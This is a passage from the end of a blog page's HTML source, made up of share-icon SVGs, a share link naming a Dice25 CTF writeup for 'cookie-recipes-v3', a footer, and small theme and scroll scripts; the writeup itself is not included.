01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Dice25: Writeup for web/cookie-recipes-v3 on ycombinator" href="https://news.ycombinator.com/submitlink?t=Dice25%3a%20Writeup%20for%20web%2fcookie-recipes-v3&u=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fdice25%2fcookie-recipes-v3%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://hxuu.github.io/blog/>hxuu</a></span> ¬∑
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>